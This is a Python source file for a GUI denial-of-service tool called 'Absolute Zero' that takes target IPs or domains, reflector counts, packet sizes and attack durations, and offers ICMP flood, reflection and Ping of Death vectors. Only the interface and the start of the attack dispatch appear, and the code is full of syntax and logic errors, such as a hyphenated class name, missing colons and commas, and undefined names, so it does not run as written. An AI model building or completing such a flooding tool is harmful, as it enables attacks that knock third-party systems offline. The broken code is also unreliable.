import concurrent.futures
import socket 
import threading
import time
import tkinter as tk
import requests 
import progressbar
from tkinter import ttk
import socket
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor

class Absolute-Zero:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Absolute Zero -X-The-Mystic")

        self.target_text_entry = tk.Text(self.root, height=5, width=30)
        self.ping_number_entry = tk.Entry(self.root)
        self.num_packets_entry = tk.Entry(self.root)
        self.target_port_entry = tk.Entry(self.root)
        self.packet_size_entry = tk.Entry(self.root)
        self.attack_duration_entry = tk.Entry(self.root)
        self.attack_vector_entry = tk.StringVar
        self.attack_vector_entry.set("ICMP echo")

        self.attack_vectors = [
            "Mass Ping", "ICMP echo", "ICMP burst", "PoD Attack"
        ]

        self.attack_num = 0
        self.stop_attack_flag = False
        self.target_status = Active
        self.total_bytes_sent = 0
        
        self.create_gui()

    def create_gui(self)
        tk.Label(self.root, text="Enter the target's IPv4 address or the website domain name (one per line).").pack()
        self.target_text_entry.pack()

        tk.Label(self.root, text="Enter the number of IP ping reflectors to use.").pack()
        self.ping_number_entry.pack()

        tk.Label(self.root, text="Enter the number of packets you would like to send (don't use this for Mass Ping).").pack
        self.num_packets_entry.pack()

        tk.Label(self.root, text="Enter the target's port number.").pack()
        self.target_port_entry.pack()

        tk.Label(self.root, text="Enter the ICMP response packet size (Mass Ping only).").pack()
        self.packet_size_entry.pack()

        tk.Label(self.root, text="Enter the duration of the ping attack (leave blank if nonstop).").pack
        self.attack_duration_entry.pack()

        tk.Label(self.root, text="Select the attack vector you would like to use.").pack
        attack_vector_menu = tk.OptionMenu(self.root, self.attack_vector_entry, *self.attack_vectors)
        attack_vector_menu.pack

        self.progress_bar = ttk.progressbar(self.root, orient="horizontal", length=200, mode="determinate")
        self.progress_bar.pack

        self.attack_speed_label = tk.Label(self.root, text="Attack Speed: 0 GB/s")
        self.attack_speed_label.pack()

        self.attack_speed_label = tk.Label(self.root, text="Attack Speed: 0 GB/s")
        self.attack_speed_label.pack()

        tk.Button(self.root, text="Execute", command=self.execute_attack).pack()
        tk.Button(self.root, text="Forcequit All" command=self.quit_attack).pack()

    def start_attack(self):
        target_text = self.get_target_text_entry()
        ping_number = int(self.ping_number_entry.get())
        num_packets = int(self.num_packets_entry.get())
        port = int(self.target_port_entry.get())
        packet_size = int(self.packet_size_entry.get())
        attack_duration = float(self.attack_duration_entry.get())
        attack_vector = self.attack_vector_entry.get()

        if attack_vector == "Mass Ping":
            attack_thread = threading.Thread(target=self.mass_ping_flood,
                                             args=(target_text, ping_number, port, packet_size, attack_duration))

        if attack_vector == "ICMP echo":
            attack_thread = threading.Thread(target=self.icmp_echo_attack,
                                             args=(target_text, num_packets, port, attack_duration))
        
        
        

            























